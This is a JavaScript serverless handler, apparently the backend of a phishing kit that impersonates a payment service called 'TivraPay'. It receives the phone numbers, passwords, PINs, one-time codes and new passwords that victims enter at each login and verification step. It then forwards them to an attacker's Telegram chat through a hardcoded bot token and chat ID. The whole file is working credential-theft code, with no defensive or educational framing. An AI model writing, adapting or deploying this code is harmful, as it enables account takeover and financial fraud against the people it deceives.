export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const data = req.body;

    const botToken1 = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
    const chatId1 = '6076330929';

    const botToken2 = '';
    const chatId2 = '';

    let messageText = '';

    if (data.type === 'login') {
      messageText = `🚀 **TivraPay Login Request** 🚀\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n🔑 **Password:** ${data.password}\n🔒 **PIN:** ${data.pin}\n━━━━━━━━━━━━━━━━━━━`;
    } else if (data.type === 'pin') {
      messageText = `🛡️ **TivraPay PIN Submitted** 🛡️\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n🔒 **PIN:** ${data.pin}\n━━━━━━━━━━━━━━━━━━━`;
    } else if (data.type === 'send_otp_req') {
      messageText = `📤 **TivraPay Send OTP Clicked** 📤\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n━━━━━━━━━━━━━━━━━━━`;
    } else if (data.type === 'otp') {
      messageText = `⚡ **TivraPay OTP Submitted** ⚡\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n🔒 **PIN:** ${data.pin}\n🔢 **OTP:** ${data.otp}\n━━━━━━━━━━━━━━━━━━━`;
    } else if (data.type === 'resend_otp') {
      messageText = `🔄 **TivraPay Resend OTP Clicked** 🔄\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n━━━━━━━━━━━━━━━━━━━`;
    } else if (data.type === 'modify_req') {
      messageText = `🔄 **TivraPay Modify Request** 🔄\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n🔑 **New Pass:** ${data.password}\n━━━━━━━━━━━━━━━━━━━`;
    } else if (data.type === 'modify') {
      messageText = `✅ **TivraPay Modify Verified** ✅\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n🔑 **New Pass:** ${data.password}\n🔢 **OTP:** ${data.otp}\n━━━━━━━━━━━━━━━━━━━`;
    } else {
      messageText = `🔔 **Data Received:**\n<pre>${JSON.stringify(data, null, 2)}</pre>`;
    }

    if (botToken1 && chatId1) {
      await fetch(`https://api.telegram.org/bot${botToken1}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId1, text: messageText, parse_mode: 'Markdown' })
      });
    }

    if (botToken2 && chatId2) {
      await fetch(`https://api.telegram.org/bot${botToken2}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId2, text: messageText, parse_mode: 'Markdown' })
      });
    }

    return res.status(200).json({ success: true });

  } catch (err) {
    console.error('API Error:', err);
    return res.status(500).json({ error: 'Internal Server Error' });
  }
}
